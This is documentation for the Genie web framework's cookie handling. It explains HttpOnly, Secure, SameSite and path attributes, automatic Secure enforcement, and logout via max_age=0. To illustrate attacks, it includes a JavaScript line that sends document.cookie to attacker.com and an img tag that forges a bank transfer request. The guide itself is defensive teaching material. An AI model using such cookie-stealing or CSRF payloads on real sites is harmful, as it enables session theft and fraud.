# Cookie Security in Genie

Security is paramount when working with cookies. Genie includes built-in mechanisms to automatically enforce security best practices, specifically regarding `SameSite` policies and token invalidation. This guide covers these automated features, common attack vectors, and best practices.

## Table of Contents

- [The Four Core Security Attributes](#the-four-core-security-attributes)
- [Automatic Security Enhancements](#automatic-security-enhancements-new)
- [Protecting Against XSS (Cross-Site Scripting)](#protecting-against-xss-cross-site-scripting)
- [Protecting Against CSRF (Cross-Site Request Forgery)](#protecting-against-csrf-cross-site-request-forgery)
- [HTTPS and the Secure Flag](#https-and-the-secure-flag)
- [Advanced: SPA Logout Pattern](#advanced-spa-logout-pattern)
- [Security Checklist](#security-checklist)

## The Four Core Security Attributes

Every cookie you set should define these four attributes:

| Attribute | Attack Prevented | How It Works | Example |
|-----------|------------------|--------------|---------|
| `httponly` | **XSS** | Hides cookie from JavaScript | `"httponly" => true` |
| `secure` | **Network Sniffing** | Sends only over HTTPS | `"secure" => true` |
| `samesite` | **CSRF** | Blocks cross-site requests | `"samesite" => "strict"` |
| `path` | **Scope Creep** | Limits cookie to specific paths | `"path" => "/"` |

## Automatic Security Enhancements (New)

Genie's `Cookies` module now includes logic to prevent common misconfigurations that can cause your application to break in modern browsers (like Chrome/Edge) or become insecure.

### 1. Auto-Enforcement of `Secure` with `SameSite=None`

If you are building an SPA (Single Page Application) that relies on **CORS** (Cross-Origin Resource Sharing), you often need to set `samesite="none"`. Modern browsers **reject** cookies with `SameSite=None` unless the `Secure` flag is also set.

Genie handles this automatically:

* **The Logic:** If you set `samesite` to `"none"` but forget `"secure" => true`, Genie automatically adds `secure=true` for you.
* **In Development:** Genie will emit a warning in the console: `@warn "Cookie 'key' with SameSite=None requires Secure=true. Adjusted automatically."`. This helps you learn browser requirements.
* **In Production:** Genie applies the fix silently to ensure your application doesn't break, without spamming your logs.

### 2. Intelligent Logout (Max-Age Fix)

Underlying HTTP libraries sometimes drop cookies with `Max-Age=0` instead of sending them to the browser. Genie intercepts `max_age=0` (or `maxage="0"`) and automatically converts it to `Expires=Thu, 01 Jan 1970 00:00:00 GMT`.

This guarantees that browsers receive the correct instruction to delete the cookie immediately.

---

## Protecting Against XSS (Cross-Site Scripting)

### The Problem

If a malicious script executes on your site, it can steal cookies via JavaScript:

```javascript
// Attacker's injected script (BAD - cookie stolen!)
fetch('[https://attacker.com/?cookie=](https://attacker.com/?cookie=)' + document.cookie);
```

### The Solution: HttpOnly Flag

Set `"httponly" => true` to prevent JavaScript from reading the cookie:

```julia
route("/api/login", method = POST) do
  token = authenticate()
  res = json(Dict("authenticated" => true))
  
  # JavaScript cannot read this cookie
  Genie.Cookies.set!(res, "auth_token", token, Dict(
    "httponly" => true  # Blocks document.cookie access
  ))
end
```

### Best Practice for SPAs

For Single-Page Applications (React, Vue, Quasar), **never store sensitive tokens in localStorage or sessionStorage**. Always use HttpOnly cookies.

## Protecting Against CSRF (Cross-Site Request Forgery)

### The Problem

An attacker's website can trick your browser into making unwanted requests to your bank or email:

```html
<img src="[https://yourbank.com/transfer?amount=1000&to=attacker](https://yourbank.com/transfer?amount=1000&to=attacker)" />
```

### The Solution: SameSite Flag

The `samesite` attribute controls whether cookies are sent in cross-site requests.

| Mode | Behavior | Use Case |
|------|----------|----------|
| `strict` | Never send in cross-site requests | **Recommended for sensitive operations** |
| `lax` | Send only for top-level navigations | **Default for modern browsers** |
| `none` | Always send (requires `secure=true`) | Rare; only for cross-origin APIs/SPAs |

## HTTPS and the Secure Flag

### The Problem

Over an unencrypted HTTP connection, cookies are visible to anyone on the network.

### The Solution: Secure Flag + HTTPS

```julia
route("/api/login", method = POST) do
  token = authenticate()
  res = json(Dict("authenticated" => true))
  
  Genie.Cookies.set!(res, "auth_token", token, Dict(
    "secure" => true,  # ← Only send over HTTPS
    "httponly" => true,
    "samesite" => "strict"
  ))
end
```

### Development vs. Production

While Genie auto-fixes `SameSite=None`, you should still configure defaults for other modes:

```julia
# config/env/dev.jl
Genie.config.cookie_defaults = Dict(
  "secure" => false,  # Allow HTTP in development for Lax/Strict cookies
  "httponly" => true,
  "samesite" => "lax"
)

# config/env/prod.jl
Genie.config.cookie_defaults = Dict(
  "secure" => true,   # Require HTTPS in production
  "httponly" => true,
  "samesite" => "strict"
)
```

> **Note on Localhost:** Modern browsers consider `localhost` to be a "Secure Context". This means cookies with `secure=true` **will work** on `http://localhost`, but will fail on `http://192.168.x.x`.

## Advanced: SPA Logout Pattern

In Single-Page Applications, the logout process must invalidate the authentication cookie on the client side.

### The Challenge

When a user logs out, you cannot simply delete the cookie from the frontend (it's HttpOnly). You must tell the browser to invalidate it.

### The Solution

Use `max_age` (or `maxage`) set to `0`. Genie detects this specific value and ensures the correct "Expires" header is sent to the browser.

```julia
route("/api/logout", method = POST) do
  res = json(Dict("status" => "logged out"))
  
  # Genie detects max_age => 0 and sends "Expires: ... 1970"
  Genie.Cookies.set!(res, "auth_token", "", Dict(
    "max_age" => 0,
    "path" => "/"   # Path must match the original cookie to delete it!
  ))
end
```

### Frontend (Vue/React/Quasar)

```javascript
// No special handling needed - just call logout endpoint
async function logout() {
  await axios.post('/api/logout');
  
  // Browser has automatically removed the cookie
  window.location.href = '/login';
}
```

### How It Works Internally

When you set `maxage=0`, Genie internally intercepts this before it reaches the HTTP library:

1.  Checks if `maxage == 0` (Int) or `maxage == "0"` (String).
2.  Removes the `Max-Age` attribute (preventing library drop issues).
3.  Adds `Expires: Thu, 01 Jan 1970 00:00:00 GMT`.

Resulting Header:
```
Set-Cookie: auth_token=; Expires=Thu, 01 Jan 1970 00:00:00 GMT; HttpOnly; Secure; SameSite=Strict
```

## Security Checklist

### For Authentication Tokens

- [ ] `httponly` = `true` (prevent XSS theft)
- [ ] `secure` = `true` (HTTPS only)
- [ ] `samesite` = `"strict"` (prevent CSRF)
- [ ] `path` = `"/"` or specific API path
- [ ] `maxage` = reasonable value (1-24 hours)

### For Session Cookies

- [ ] `httponly` = `true` (prevent XSS theft)
- [ ] `secure` = `true` (HTTPS only)
- [ ] `samesite` = `"lax"` (balance usability and security)
- [ ] `maxage` = defined (avoid infinite lifetime)

### Production Deployment

- [ ] All authentication cookies have `secure=true`
- [ ] Application runs on HTTPS
- [ ] Config defaults (`Genie.config.cookie_defaults`) are optimized for Prod
- [ ] Logout properly invalidates cookies using `max_age=0`
- [ ] Check logs for Genie "Auto-Secure" warnings during development